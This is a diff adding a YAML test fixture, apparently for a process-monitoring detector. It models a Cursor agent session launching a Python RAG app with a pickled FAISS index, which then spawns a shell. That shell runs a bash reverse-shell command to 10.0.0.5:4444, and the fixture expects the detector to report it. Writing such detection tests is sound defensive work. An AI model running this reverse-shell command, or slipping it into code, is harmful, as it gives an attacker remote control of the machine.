@@ -1,0 +1,30 @@
+subjects:
+  cursor:
+    session: pid/100:1
+    program: /Applications/Cursor.app/Contents/MacOS/Cursor
+    agent: true
+    actors: [{id: u1, name: Dev, email: dev@example.com}]
+    device: dev-1
+    source: probe
+  python:
+    session: pid/101:1
+    parent: cursor
+    program: /usr/local/bin/python3
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  sh:
+    session: pid/102:1
+    parent: python
+    program: /bin/sh
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+observations:
+  - {kind: session_start, subject: cursor}
+  - {kind: spawn, subject: python, cmdline: "python3 rag_app.py --langchain --faiss-index ./index.pkl"}
+  - {kind: spawn, subject: sh, cmdline: "sh -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'"}
+expect:
+  action: report
+  reason_contains: "python host python3 spawned a high-confidence payload process; lineage sh <- python3 <- Cursor; interpreter cmdline references langchain/faiss/pickle"
+  chain_min: 2
